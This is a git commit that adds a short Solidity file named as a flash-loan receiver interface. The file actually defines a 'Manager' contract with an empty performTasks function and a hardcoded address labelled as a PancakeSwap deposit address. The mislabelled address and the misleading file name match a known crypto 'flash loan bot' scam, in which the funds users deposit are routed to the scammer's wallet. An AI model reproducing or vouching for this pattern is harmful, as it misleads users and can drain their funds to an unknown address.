605156f38592f6718e21db3df9c63bf57e03fedb
rxwlvn <88416792+rxwlvn@users.noreply.github.com>
2021-09-14 14:43:10 -0500

    Create iFlashLoanReceiver.sol

---
+++ iFlashLoanReceiver.sol
@@ -0,0 +1,12 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public {
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xAEf508A99A7322558019412676DC0aE79aA233D9;
+    }
+    
+}
